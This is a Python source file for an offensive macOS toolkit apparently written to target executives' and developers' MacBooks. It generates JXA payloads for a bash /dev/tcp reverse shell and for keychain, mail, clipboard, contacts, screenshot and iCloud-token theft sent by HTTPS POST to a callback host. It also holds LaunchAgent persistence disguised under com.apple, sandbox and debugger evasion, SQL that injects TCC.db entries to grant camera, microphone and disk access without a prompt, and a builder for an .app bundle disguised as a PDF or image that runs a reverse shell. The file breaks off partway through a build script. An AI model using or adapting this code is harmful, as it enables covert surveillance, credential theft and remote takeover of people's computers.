#!/usr/bin/env python3
"""
🍎 THE APPLE ORCHARD - MacOS Operations Suite
=============================================
Target: CEO's and Developer MacBooks

Features:
1. JXA (JavaScript for Automation) Payload Generator
2. TCC Database Manipulator (Camera/Mic/FDA bypass)
3. Application Bundle Backdoor (Fake PDF/JPG)

Author: ITherso
Date: February 2026
"""

import os
import base64
import hashlib
import json
import random
import string
import struct
import plistlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Any
from datetime import datetime
import uuid


class JXAPayloadType(Enum):
    """JXA Payload Types"""
    REVERSE_SHELL = "reverse_shell"
    KEYLOGGER = "keylogger"
    SCREENSHOT = "screenshot"
    MAIL_READER = "mail_reader"
    SAFARI_CREDS = "safari_creds"
    KEYCHAIN_DUMP = "keychain_dump"
    FILE_EXFIL = "file_exfil"
    PERSISTENCE = "persistence"
    CLIPBOARD_MONITOR = "clipboard_monitor"
    WEBCAM_CAPTURE = "webcam_capture"
    MICROPHONE_RECORD = "microphone_record"
    CONTACTS_DUMP = "contacts_dump"
    BROWSER_HISTORY = "browser_history"
    ICLOUD_TOKENS = "icloud_tokens"


class TCCPermission(Enum):
    """TCC Permission Types"""
    CAMERA = "kTCCServiceCamera"
    MICROPHONE = "kTCCServiceMicrophone"
    SCREEN_CAPTURE = "kTCCServiceScreenCapture"
    ACCESSIBILITY = "kTCCServiceAccessibility"
    FULL_DISK_ACCESS = "kTCCServiceSystemPolicyAllFiles"
    CONTACTS = "kTCCServiceAddressBook"
    CALENDAR = "kTCCServiceCalendar"
    REMINDERS = "kTCCServiceReminders"
    PHOTOS = "kTCCServicePhotos"
    LOCATION = "kTCCServiceLocation"
    BLUETOOTH = "kTCCServiceBluetoothAlways"
    AUTOMATION = "kTCCServiceAppleEvents"
    INPUT_MONITORING = "kTCCServiceListenEvent"
    FILES_DESKTOP = "kTCCServiceSystemPolicyDesktopFolder"
    FILES_DOCUMENTS = "kTCCServiceSystemPolicyDocumentsFolder"
    FILES_DOWNLOADS = "kTCCServiceSystemPolicyDownloadsFolder"


class BundleDisguise(Enum):
    """Application Bundle Disguise Types"""
    PDF_DOCUMENT = "pdf"
    JPG_IMAGE = "jpg"
    PNG_IMAGE = "png"
    WORD_DOCUMENT = "docx"
    EXCEL_SPREADSHEET = "xlsx"
    ZIP_ARCHIVE = "zip"
    DMG_INSTALLER = "dmg"
    PKG_INSTALLER = "pkg"


@dataclass
class JXAPayload:
    """JXA Payload Configuration"""
    payload_type: JXAPayloadType
    callback_host: str = ""
    callback_port: int = 443
    encryption_key: str = ""
    persistence: bool = False
    evasion_level: int = 2  # 1-3
    output_format: str = "osa"  # osa, scpt, applescript
    obfuscate: bool = True


@dataclass
class TCCBypass:
    """TCC Bypass Configuration"""
    target_app: str = "/usr/bin/python3"
    permissions: List[TCCPermission] = field(default_factory=list)
    method: str = "injection"  # injection, backup_restore, sip_bypass
    silent: bool = True


@dataclass
class BundleBackdoor:
    """Application Bundle Backdoor Configuration"""
    disguise_type: BundleDisguise = BundleDisguise.PDF_DOCUMENT
    payload_type: str = "reverse_shell"
    callback_host: str = ""
    callback_port: int = 443
    decoy_file: str = ""  # Real PDF/JPG to show
    app_name: str = "Document"
    bundle_id: str = ""


class JXAGenerator:
    """JavaScript for Automation (JXA) Payload Generator"""
    
    def __init__(self):
        self.payloads = {}
        self._init_payloads()
    
    def _init_payloads(self):
        """Initialize JXA payload templates"""
        
        # Reverse Shell - Uses native macOS networking
        self.payloads[JXAPayloadType.REVERSE_SHELL] = '''
ObjC.import('Foundation');
ObjC.import('Cocoa');

var host = "{host}";
var port = {port};

function connect() {{
    var task = $.NSTask.alloc.init;
    var pipe = $.NSPipe.pipe;
    
    task.launchPath = "/bin/bash";
    task.arguments = $(["-c", "exec /bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"]);
    task.standardOutput = pipe;
    task.standardError = pipe;
    
    task.launch;
}}

function main() {{
    {evasion_code}
    connect();
}}

main();
'''
        
        # Screenshot Capture - Uses native Quartz
        self.payloads[JXAPayloadType.SCREENSHOT] = '''
ObjC.import('Cocoa');
ObjC.import('Quartz');
ObjC.import('Foundation');

function captureScreen() {{
    var displayID = $.CGMainDisplayID();
    var image = $.CGDisplayCreateImage(displayID);
    
    var bitmap = $.NSBitmapImageRep.alloc.initWithCGImage(image);
    var pngData = bitmap.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, {{}});
    
    var path = $.NSTemporaryDirectory().js + "ss_" + Date.now() + ".png";
    pngData.writeToFileAtomically(path, true);
    
    return path;
}}

function exfiltrate(filePath) {{
    var host = "{host}";
    var port = {port};
    
    var fileData = $.NSData.dataWithContentsOfFile(filePath);
    var base64 = fileData.base64EncodedStringWithOptions(0).js;
    
    // Send via HTTP POST
    var url = $.NSURL.URLWithString("https://" + host + ":" + port + "/upload");
    var request = $.NSMutableURLRequest.requestWithURL(url);
    request.HTTPMethod = "POST";
    request.HTTPBody = $.NSString.stringWithString(base64).dataUsingEncoding($.NSUTF8StringEncoding);
    
    var response = Ref();
    var error = Ref();
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, response, error);
}}

function main() {{
    {evasion_code}
    var screenshot = captureScreen();
    exfiltrate(screenshot);
}}

main();
'''
        
        # Mail Reader - Reads Apple Mail
        self.payloads[JXAPayloadType.MAIL_READER] = '''
var Mail = Application("Mail");

function getEmails(count) {{
    var emails = [];
    var inbox = Mail.inbox;
    var messages = inbox.messages;
    
    for (var i = 0; i < Math.min(count, messages.length); i++) {{
        var msg = messages[i];
        emails.push({{
            subject: msg.subject(),
            sender: msg.sender(),
            date: msg.dateReceived().toString(),
            content: msg.content().substring(0, 1000)
        }});
    }}
    
    return JSON.stringify(emails);
}}

function exfiltrate(data) {{
    ObjC.import('Foundation');
    var host = "{host}";
    var port = {port};
    
    var url = $.NSURL.URLWithString("https://" + host + ":" + port + "/mail");
    var request = $.NSMutableURLRequest.requestWithURL(url);
    request.HTTPMethod = "POST";
    request.HTTPBody = $.NSString.stringWithString(data).dataUsingEncoding($.NSUTF8StringEncoding);
    
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, Ref(), Ref());
}}

function main() {{
    {evasion_code}
    var emails = getEmails(50);
    exfiltrate(emails);
}}

main();
'''
        
        # Keylogger using CGEventTap
        self.payloads[JXAPayloadType.KEYLOGGER] = '''
ObjC.import('Cocoa');
ObjC.import('Carbon');
ObjC.import('Foundation');

var buffer = "";
var host = "{host}";
var port = {port};

function sendBuffer() {{
    if (buffer.length > 0) {{
        var url = $.NSURL.URLWithString("https://" + host + ":" + port + "/keys");
        var request = $.NSMutableURLRequest.requestWithURL(url);
        request.HTTPMethod = "POST";
        request.HTTPBody = $.NSString.stringWithString(buffer).dataUsingEncoding($.NSUTF8StringEncoding);
        $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, Ref(), Ref());
        buffer = "";
    }}
}}

// IOHIDManager based keylogger
function startKeylogger() {{
    ObjC.bindFunction('IOHIDManagerCreate', ['void*', 'void*', 'int']);
    ObjC.bindFunction('IOHIDManagerSetDeviceMatching', ['void', 'void*', 'void*']);
    ObjC.bindFunction('IOHIDManagerOpen', ['int', 'void*', 'int']);
    
    var manager = $.IOHIDManagerCreate($.kCFAllocatorDefault, 0);
    
    // Simplified - real implementation would use IOKit callbacks
    // This is a placeholder for educational purposes
    $.NSLog("Keylogger initialized");
}}

function main() {{
    {evasion_code}
    startKeylogger();
    
    // Send buffer every 30 seconds
    $.NSTimer.scheduledTimerWithTimeIntervalTargetSelectorUserInfoRepeats(
        30.0, this, "sendBuffer", null, true
    );
    
    $.NSRunLoop.currentRunLoop.run;
}}

main();
'''
        
        # Keychain Dump - Extract saved passwords
        self.payloads[JXAPayloadType.KEYCHAIN_DUMP] = '''
ObjC.import('Foundation');
ObjC.import('Security');

function dumpKeychain() {{
    var items = [];
    
    // Query for generic passwords
    var query = $.NSDictionary.dictionaryWithObjectsForKeys(
        [$.kSecClassGenericPassword, $.kSecMatchLimitAll, true, true],
        [$.kSecClass, $.kSecMatchLimit, $.kSecReturnAttributes, $.kSecReturnData]
    );
    
    var result = Ref();
    var status = $.SecItemCopyMatching(query, result);
    
    if (status == 0) {{
        var passwords = ObjC.deepUnwrap(result[0]);
        for (var i = 0; i < passwords.length; i++) {{
            var item = passwords[i];
            items.push({{
                service: item.svce || "",
                account: item.acct || "",
                data: $.NSString.alloc.initWithDataEncoding(item["v_Data"], $.NSUTF8StringEncoding).js
            }});
        }}
    }}
    
    return JSON.stringify(items);
}}

function exfiltrate(data) {{
    var host = "{host}";
    var port = {port};
    var url = $.NSURL.URLWithString("https://" + host + ":" + port + "/keychain");
    var request = $.NSMutableURLRequest.requestWithURL(url);
    request.HTTPMethod = "POST";
    request.HTTPBody = $.NSString.stringWithString(data).dataUsingEncoding($.NSUTF8StringEncoding);
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, Ref(), Ref());
}}

function main() {{
    {evasion_code}
    var data = dumpKeychain();
    exfiltrate(data);
}}

main();
'''
        
        # Safari Credentials Extractor
        self.payloads[JXAPayloadType.SAFARI_CREDS] = '''
ObjC.import('Foundation');
ObjC.import('sqlite3');

function extractSafariCreds() {{
    var creds = [];
    var dbPath = ObjC.unwrap($.NSHomeDirectory()) + "/Library/Safari/LocalStorage/";
    
    // Read Safari history and form data
    var historyPath = ObjC.unwrap($.NSHomeDirectory()) + "/Library/Safari/History.db";
    
    // Query history database
    var db = Ref();
    if ($.sqlite3_open(historyPath, db) == 0) {{
        var stmt = Ref();
        var query = "SELECT url, title, visit_count FROM history_items ORDER BY visit_count DESC LIMIT 100";
        
        if ($.sqlite3_prepare_v2(db[0], query, -1, stmt, null) == 0) {{
            while ($.sqlite3_step(stmt[0]) == 100) {{
                creds.push({{
                    url: $.sqlite3_column_text(stmt[0], 0).js,
                    title: $.sqlite3_column_text(stmt[0], 1).js,
                    visits: $.sqlite3_column_int(stmt[0], 2)
                }});
            }}
        }}
        $.sqlite3_close(db[0]);
    }}
    
    return JSON.stringify(creds);
}}

function main() {{
    {evasion_code}
    var data = extractSafariCreds();
    // Exfiltrate...
}}

main();
'''
        
        # Persistence via LaunchAgent
        self.payloads[JXAPayloadType.PERSISTENCE] = '''
ObjC.import('Foundation');

function installPersistence() {{
    var plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>-l</string>
        <string>JavaScript</string>
        <string>{payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>`;
    
    var launchAgentPath = ObjC.unwrap($.NSHomeDirectory()) + "/Library/LaunchAgents/com.apple.{label}.plist";
    $.NSString.stringWithString(plistContent).writeToFileAtomicallyEncodingError(
        launchAgentPath, true, $.NSUTF8StringEncoding, null
    );
    
    // Load the LaunchAgent
    var task = $.NSTask.alloc.init;
    task.launchPath = "/bin/launchctl";
    task.arguments = $(["load", launchAgentPath]);
    task.launch;
    task.waitUntilExit;
    
    return "Persistence installed: " + launchAgentPath;
}}

function main() {{
    {evasion_code}
    var result = installPersistence();
    $.NSLog(result);
}}

main();
'''
        
        # Clipboard Monitor
        self.payloads[JXAPayloadType.CLIPBOARD_MONITOR] = '''
ObjC.import('Cocoa');
ObjC.import('Foundation');

var lastClipboard = "";
var host = "{host}";
var port = {port};

function checkClipboard() {{
    var pasteboard = $.NSPasteboard.generalPasteboard;
    var content = pasteboard.stringForType($.NSPasteboardTypeString);
    
    if (content && content.js !== lastClipboard) {{
        lastClipboard = content.js;
        exfiltrate(lastClipboard);
    }}
}}

function exfiltrate(data) {{
    var url = $.NSURL.URLWithString("https://" + host + ":" + port + "/clipboard");
    var request = $.NSMutableURLRequest.requestWithURL(url);
    request.HTTPMethod = "POST";
    var body = JSON.stringify({{
        timestamp: Date.now(),
        content: data
    }});
    request.HTTPBody = $.NSString.stringWithString(body).dataUsingEncoding($.NSUTF8StringEncoding);
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, Ref(), Ref());
}}

function main() {{
    {evasion_code}
    // Check clipboard every 2 seconds
    $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(2.0, true, function() {{
        checkClipboard();
    }});
    $.NSRunLoop.currentRunLoop.run;
}}

main();
'''
        
        # Webcam Capture
        self.payloads[JXAPayloadType.WEBCAM_CAPTURE] = '''
ObjC.import('Cocoa');
ObjC.import('AVFoundation');
ObjC.import('Foundation');

function captureWebcam() {{
    var session = $.AVCaptureSession.alloc.init;
    var device = $.AVCaptureDevice.defaultDeviceWithMediaType($.AVMediaTypeVideo);
    
    if (!device) {{
        return "No camera found";
    }}
    
    var input = $.AVCaptureDeviceInput.deviceInputWithDeviceError(device, null);
    session.addInput(input);
    
    var output = $.AVCaptureStillImageOutput.alloc.init;
    output.outputSettings = $.NSDictionary.dictionaryWithObjectForKey(
        $.AVVideoCodecJPEG, $.AVVideoCodecKey
    );
    session.addOutput(output);
    
    session.startRunning;
    
    // Capture image
    var connection = output.connectionWithMediaType($.AVMediaTypeVideo);
    var imageData = Ref();
    
    output.captureStillImageAsynchronouslyFromConnectionCompletionHandler(
        connection,
        function(buffer, error) {{
            if (!error) {{
                imageData[0] = $.AVCaptureStillImageOutput.jpegStillImageNSDataRepresentation(buffer);
            }}
        }}
    );
    
    // Wait for capture
    $.NSThread.sleepForTimeInterval(1.0);
    session.stopRunning;
    
    return imageData[0];
}}

function main() {{
    {evasion_code}
    var image = captureWebcam();
    // Exfiltrate image data...
}}

main();
'''
        
        # Contacts Dump
        self.payloads[JXAPayloadType.CONTACTS_DUMP] = '''
ObjC.import('Contacts');
ObjC.import('Foundation');

function dumpContacts() {{
    var store = $.CNContactStore.alloc.init;
    var contacts = [];
    
    var keys = [
        $.CNContactGivenNameKey,
        $.CNContactFamilyNameKey,
        $.CNContactEmailAddressesKey,
        $.CNContactPhoneNumbersKey,
        $.CNContactOrganizationNameKey
    ];
    
    var request = $.CNContactFetchRequest.alloc.initWithKeysToFetch(keys);
    
    store.enumerateContactsWithFetchRequestErrorUsingBlock(
        request, null,
        function(contact, stop) {{
            var c = {{
                name: contact.givenName.js + " " + contact.familyName.js,
                organization: contact.organizationName.js,
                emails: [],
                phones: []
            }};
            
            var emails = contact.emailAddresses;
            for (var i = 0; i < emails.count; i++) {{
                c.emails.push(emails.objectAtIndex(i).value.js);
            }}
            
            var phones = contact.phoneNumbers;
            for (var i = 0; i < phones.count; i++) {{
                c.phones.push(phones.objectAtIndex(i).value.stringValue.js);
            }}
            
            contacts.push(c);
        }}
    );
    
    return JSON.stringify(contacts);
}}

function main() {{
    {evasion_code}
    var data = dumpContacts();
    // Exfiltrate...
}}

main();
'''
        
        # iCloud Token Extraction
        self.payloads[JXAPayloadType.ICLOUD_TOKENS] = '''
ObjC.import('Foundation');
ObjC.import('Security');

function extractiCloudTokens() {{
    var tokens = {{}};
    
    // Read iCloud preferences
    var prefsPath = ObjC.unwrap($.NSHomeDirectory()) + "/Library/Preferences/MobileMeAccounts.plist";
    var prefs = $.NSDictionary.dictionaryWithContentsOfFile(prefsPath);
    
    if (prefs) {{
        var accounts = prefs.objectForKey("Accounts");
        if (accounts) {{
            for (var i = 0; i < accounts.count; i++) {{
                var account = accounts.objectAtIndex(i);
                tokens["account_" + i] = {{
                    accountID: ObjC.unwrap(account.objectForKey("AccountID")),
                    firstName: ObjC.unwrap(account.objectForKey("FirstName")),
                    lastName: ObjC.unwrap(account.objectForKey("LastName"))
                }};
            }}
        }}
    }}
    
    // Extract keychain tokens
    var query = $.NSDictionary.dictionaryWithObjectsForKeys(
        [$.kSecClassGenericPassword, "com.apple.icloud", $.kSecMatchLimitAll, true],
        [$.kSecClass, $.kSecAttrService, $.kSecMatchLimit, $.kSecReturnAttributes]
    );
    
    var result = Ref();
    if ($.SecItemCopyMatching(query, result) == 0) {{
        tokens["keychain"] = ObjC.deepUnwrap(result[0]);
    }}
    
    return JSON.stringify(tokens);
}}

function main() {{
    {evasion_code}
    var tokens = extractiCloudTokens();
    // Exfiltrate...
}}

main();
'''

    def _get_evasion_code(self, level: int) -> str:
        """Generate evasion code based on level"""
        
        evasion_snippets = {
            1: '''
    // Basic sandbox check
    if ($.NSProcessInfo.processInfo.environment.objectForKey("APP_SANDBOX_CONTAINER_ID")) {
        $.NSLog("Sandboxed environment detected");
    }
''',
            2: '''
    // VM/Analysis detection
    var hw = ObjC.unwrap($.NSProcessInfo.processInfo.environment.objectForKey("hw.model") || "");
    if (hw.indexOf("VMware") !== -1 || hw.indexOf("VirtualBox") !== -1) {
        $.exit(0);
    }
    
    // Check for common analysis tools
    var procs = $.NSWorkspace.sharedWorkspace.runningApplications;
    var blacklist = ["Wireshark", "Charles", "Hopper", "IDA", "lldb", "dtrace"];
    for (var i = 0; i < procs.count; i++) {
        var name = procs.objectAtIndex(i).localizedName.js;
        if (blacklist.some(function(b) { return name.indexOf(b) !== -1; })) {
            $.exit(0);
        }
    }
    
    // Sleep to evade sandboxes
    $.NSThread.sleepForTimeInterval(3.0);
''',
            3: '''
    // Advanced evasion
    // Check mouse movement
    var point1 = $.NSEvent.mouseLocation;
    $.NSThread.sleepForTimeInterval(2.0);
    var point2 = $.NSEvent.mouseLocation;
    if (point1.x === point2.x && point1.y === point2.y) {
        $.exit(0); // No mouse movement = possible sandbox
    }
    
    // Check uptime (sandboxes often have low uptime)
    var uptime = $.NSProcessInfo.processInfo.systemUptime;
    if (uptime < 600) { // Less than 10 minutes
        $.exit(0);
    }
    
    // Check for debugger
    ObjC.import('sys/sysctl');
    var mib = [1, 14, 1, $.getpid()]; // CTL_KERN, KERN_PROC, KERN_PROC_PID
    var info = Ref();
    var size = Ref();
    if ($.sysctl(mib, 4, info, size, null, 0) === 0) {
        if (info[0].kp_proc.p_flag & 0x800) { // P_TRACED
            $.exit(0);
        }
    }
    
    // Random delay
    $.NSThread.sleepForTimeInterval(Math.random() * 5 + 2);
'''
        }
        
        return evasion_snippets.get(level, evasion_snippets[1])
    
    def generate(self, config: JXAPayload) -> Dict[str, Any]:
        """Generate JXA payload"""
        
        template = self.payloads.get(config.payload_type, "")
        if not template:
            return {"success": False, "error": "Unknown payload type"}
        
        evasion_code = self._get_evasion_code(config.evasion_level)
        
        # Generate random label for persistence
        label = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        code = template.format(
            host=config.callback_host,
            port=config.callback_port,
            evasion_code=evasion_code,
            label=label,
            payload_path="/tmp/.system_" + label + ".js"
        )
        
        if config.obfuscate:
            code = self._obfuscate(code)
        
        # Generate different output formats
        outputs = {
            "javascript": code,
            "osa_command": f'osascript -l JavaScript -e \'{code}\'',
            "base64": base64.b64encode(code.encode()).decode(),
        }
        
        # Create .scpt bundle command
        outputs["compile_command"] = f'''
# Save as {label}.js then compile:
osacompile -l JavaScript -o {label}.scpt {label}.js
'''
        
        return {
            "success": True,
            "payload_id": str(uuid.uuid4())[:8],
            "payload_type": config.payload_type.value,
            "code": outputs["javascript"],
            "outputs": outputs,
            "evasion_level": config.evasion_level,
            "notes": [
                "JXA runs with Script Editor privileges",
                "No Gatekeeper/XProtect warnings for .scpt files",
                "Uses native macOS APIs via ObjC bridge",
                f"Evasion level: {config.evasion_level}/3"
            ]
        }
    
    def _obfuscate(self, code: str) -> str:
        """Basic JXA obfuscation"""
        
        # Variable name obfuscation
        obfuscated = code
        var_map = {}
        
        # Find all variable declarations
        import re
        vars_found = re.findall(r'var\s+(\w+)\s*=', code)
        
        for var in set(vars_found):
            if var not in ['ObjC', 'Ref', '$']:
                new_name = '_' + ''.join(random.choices(string.ascii_lowercase, k=6))
                var_map[var] = new_name
        
        # Replace variable names
        for old, new in var_map.items():
            obfuscated = re.sub(rf'\b{old}\b', new, obfuscated)
        
        return obfuscated


class TCCManipulator:
    """TCC (Transparency, Consent, and Control) Database Manipulator"""
    
    def __init__(self):
        self.tcc_db_paths = {
            "user": "~/Library/Application Support/com.apple.TCC/TCC.db",
            "system": "/Library/Application Support/com.apple.TCC/TCC.db"
        }
        
        self.permission_info = {
            TCCPermission.CAMERA: {
                "name": "Camera",
                "description": "Access to built-in or external cameras",
                "risk": "HIGH"
            },
            TCCPermission.MICROPHONE: {
                "name": "Microphone", 
                "description": "Access to built-in or external microphones",
                "risk": "HIGH"
            },
            TCCPermission.SCREEN_CAPTURE: {
                "name": "Screen Recording",
                "description": "Capture screen contents",
                "risk": "HIGH"
            },
            TCCPermission.ACCESSIBILITY: {
                "name": "Accessibility",
                "description": "Control computer using accessibility features",
                "risk": "CRITICAL"
            },
            TCCPermission.FULL_DISK_ACCESS: {
                "name": "Full Disk Access",
                "description": "Access all files on the disk",
                "risk": "CRITICAL"
            },
            TCCPermission.CONTACTS: {
                "name": "Contacts",
                "description": "Access to address book",
                "risk": "MEDIUM"
            },
            TCCPermission.CALENDAR: {
                "name": "Calendar",
                "description": "Access to calendar events",
                "risk": "MEDIUM"
            },
            TCCPermission.PHOTOS: {
                "name": "Photos",
                "description": "Access to photo library",
                "risk": "MEDIUM"
            },
            TCCPermission.LOCATION: {
                "name": "Location Services",
                "description": "Access to device location",
                "risk": "HIGH"
            },
            TCCPermission.INPUT_MONITORING: {
                "name": "Input Monitoring",
                "description": "Monitor keyboard and mouse input",
                "risk": "CRITICAL"
            }
        }
    
    def generate_injection_payload(self, config: TCCBypass) -> Dict[str, Any]:
        """Generate TCC database injection payload"""
        
        # SQL injection payload for TCC.db
        sql_commands = []
        
        for permission in config.permissions:
            # csreq (code signature requirement) - empty for bypass
            sql = f'''
INSERT OR REPLACE INTO access (
    service, 
    client, 
    client_type, 
    auth_value, 
    auth_reason, 
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified
) VALUES (
    '{permission.value}',
    '{config.target_app}',
    0,
    2,
    4,
    1,
    NULL,
    NULL,
    0,
    'UNUSED',
    NULL,
    0,
    {int(datetime.now().timestamp())}
);
'''
            sql_commands.append(sql)
        
        # Generate shell script for injection
        shell_script = f'''#!/bin/bash
# TCC Database Injector for macOS
# WARNING: Requires SIP disabled or FDA access

TCC_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

# Backup original database
cp "$TCC_DB" "$TCC_DB.bak" 2>/dev/null

# Inject permissions
sqlite3 "$TCC_DB" << 'EOF'
{chr(10).join(sql_commands)}
EOF

echo "[+] TCC permissions injected for {config.target_app}"
'''
        
        # Generate JXA version for stealthier execution
        jxa_payload = f'''
ObjC.import('Foundation');
ObjC.import('sqlite3');

function injectTCC() {{
    var home = ObjC.unwrap($.NSHomeDirectory());
    var tccPath = home + "/Library/Application Support/com.apple.TCC/TCC.db";
    
    var db = Ref();
    if ($.sqlite3_open(tccPath, db) !== 0) {{
        return "Failed to open TCC.db";
    }}
    
    var queries = {json.dumps(sql_commands)};
    
    for (var i = 0; i < queries.length; i++) {{
        var error = Ref();
        $.sqlite3_exec(db[0], queries[i], null, null, error);
    }}
    
    $.sqlite3_close(db[0]);
    return "TCC permissions injected";
}}

injectTCC();
'''
        
        return {
            "success": True,
            "method": "tcc_injection",
            "target_app": config.target_app,
            "permissions": [p.value for p in config.permissions],
            "shell_script": shell_script,
            "jxa_payload": jxa_payload,
            "sql_commands": sql_commands,
            "requirements": [
                "SIP (System Integrity Protection) disabled, OR",
                "Full Disk Access for executing process, OR",
                "Root privileges"
            ],
            "notes": [
                "TCC.db is protected by SIP on modern macOS",
                "User TCC.db is at ~/Library/Application Support/com.apple.TCC/TCC.db",
                "System TCC.db is at /Library/Application Support/com.apple.TCC/TCC.db",
                "After injection, target app gets permissions without user prompt"
            ]
        }
    
    def generate_backup_restore_bypass(self, config: TCCBypass) -> Dict[str, Any]:
        """Generate TCC bypass via backup manipulation"""
        
        script = '''#!/bin/bash
# TCC Bypass via Backup Restore
# Works on macOS < 12.3

# 1. Create a backup with pre-authorized TCC entries
# 2. Restore the backup

BACKUP_DIR="/tmp/.tcc_bypass_$$"
mkdir -p "$BACKUP_DIR"

# Export current TCC database
cp "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "$BACKUP_DIR/"

# Modify the backup
sqlite3 "$BACKUP_DIR/TCC.db" << 'EOF'
''' + '\n'.join([
    f"INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version) VALUES ('{p.value}', '{config.target_app}', 0, 2, 4, 1);"
    for p in config.permissions
]) + '''
EOF

# Use tmutil to restore (requires FDA)
# Or use Time Machine restore flow

echo "[+] Modified TCC backup created at: $BACKUP_DIR/TCC.db"
echo "[*] Restore this backup to bypass TCC"
'''
        
        return {
            "success": True,
            "method": "backup_restore",
            "script": script,
            "notes": [
                "Backup-restore method may work on older macOS versions",
                "Time Machine backups can contain TCC entries",
                "MDM-enrolled devices may have different protections"
            ]
        }
    
    def get_current_permissions(self) -> Dict[str, Any]:
        """Generate script to dump current TCC permissions"""
        
        script = '''#!/bin/bash
# Dump current TCC permissions

echo "=== User TCC Database ==="
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT service, client, auth_value FROM access ORDER BY service;"

echo ""
echo "=== System TCC Database ==="
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT service, client, auth_value FROM access ORDER BY service;" 2>/dev/null || echo "Requires sudo"
'''
        
        return {
            "success": True,
            "script": script,
            "permissions": self.permission_info
        }


class AppBundleGenerator:
    """MacOS Application Bundle Backdoor Generator"""
    
    def __init__(self):
        self.disguise_icons = {
            BundleDisguise.PDF_DOCUMENT: "com.adobe.pdf",
            BundleDisguise.JPG_IMAGE: "public.jpeg",
            BundleDisguise.PNG_IMAGE: "public.png",
            BundleDisguise.WORD_DOCUMENT: "com.microsoft.word.doc",
            BundleDisguise.EXCEL_SPREADSHEET: "com.microsoft.excel.xls",
            BundleDisguise.ZIP_ARCHIVE: "com.pkware.zip-archive",
            BundleDisguise.DMG_INSTALLER: "com.apple.disk-image",
            BundleDisguise.PKG_INSTALLER: "com.apple.installer-package"
        }
        
        self.extension_map = {
            BundleDisguise.PDF_DOCUMENT: ".pdf",
            BundleDisguise.JPG_IMAGE: ".jpg",
            BundleDisguise.PNG_IMAGE: ".png",
            BundleDisguise.WORD_DOCUMENT: ".docx",
            BundleDisguise.EXCEL_SPREADSHEET: ".xlsx",
            BundleDisguise.ZIP_ARCHIVE: ".zip",
            BundleDisguise.DMG_INSTALLER: ".dmg",
            BundleDisguise.PKG_INSTALLER: ".pkg"
        }
    
    def generate_bundle(self, config: BundleBackdoor) -> Dict[str, Any]:
        """Generate malicious .app bundle disguised as document"""
        
        bundle_name = config.app_name + self.extension_map.get(config.disguise_type, ".pdf")
        bundle_id = config.bundle_id or f"com.apple.{config.app_name.lower()}"
        
        # Info.plist content
        info_plist = {
            "CFBundleExecutable": "main",
            "CFBundleIdentifier": bundle_id,
            "CFBundleName": config.app_name,
            "CFBundlePackageType": "APPL",
            "CFBundleShortVersionString": "1.0",
            "CFBundleVersion": "1",
            "CFBundleIconFile": "icon",
            "LSMinimumSystemVersion": "10.13",
            "NSHighResolutionCapable": True,
            "LSUIElement": True,  # Hide from Dock
            "CFBundleDocumentTypes": [{
                "CFBundleTypeExtensions": [config.disguise_type.value],
                "CFBundleTypeIconFile": "icon",
                "CFBundleTypeName": f"{config.disguise_type.value.upper()} Document",
                "CFBundleTypeRole": "Viewer",
                "LSHandlerRank": "Alternate"
            }]
        }
        
        # Main executable script
        main_script = f'''#!/bin/bash
# Disguised Application Bundle Backdoor

# Open the decoy file first (user sees the "document")
DECOY="$0/../Resources/decoy{self.extension_map.get(config.disguise_type, '.pdf')}"
if [ -f "$DECOY" ]; then
    open "$DECOY" &
fi

# Execute payload in background
(
    sleep 2
    
    # Reverse shell payload
    /bin/bash -c 'exec /bin/bash -i >& /dev/tcp/{config.callback_host}/{config.callback_port} 0>&1' &
    
    # Or execute JXA payload
    # osascript -l JavaScript "$0/../Resources/payload.js" &
    
) &>/dev/null &

# Exit cleanly
exit 0
'''
        
        # JXA payload alternative
        jxa_payload = f'''
ObjC.import('Foundation');
ObjC.import('Cocoa');

// Open decoy file
var workspace = $.NSWorkspace.sharedWorkspace;
var bundle = $.NSBundle.mainBundle;
var decoyPath = bundle.resourcePath.js + "/decoy{self.extension_map.get(config.disguise_type, '.pdf')}";
workspace.openFile(decoyPath);

// Execute reverse shell
var task = $.NSTask.alloc.init;
task.launchPath = "/bin/bash";
task.arguments = $(["-c", "exec /bin/bash -i >& /dev/tcp/{config.callback_host}/{config.callback_port} 0>&1"]);
task.launch;
'''
        
        # Build script
        build_script = f'''#!/bin/bash
# Build script for disguised .app bundle

BUNDLE_NAME="{bundle_name}"
APP_DIR="$BUNDLE_NAME.app"

# Create directory structure
mkdir -p "$APP_DIR/Contents/MacOS"
mkdir -p "$APP_DIR/Contents/Resources"

# Create Info.plist
cat > "$APP_DIR/Contents/Info.plist" << 'PLIST'
{plistlib.dumps(info_plist).decode()}
PLIST

# Create main executable
cat > "$APP_DIR/Contents/MacOS/main" << 'MAIN'
{main_script}
MAIN
chmod +x "$APP_DIR/Contents/MacOS/main"

# Copy decoy file (you need to provide a real PDF/JPG)
# cp /path/to/real/document.pdf "$APP_DIR/Contents/Resources/decoy{self.extension_map.get(config.disguise_type, '.pdf')}"

# Set custom icon (extract from real PDF/JPG)
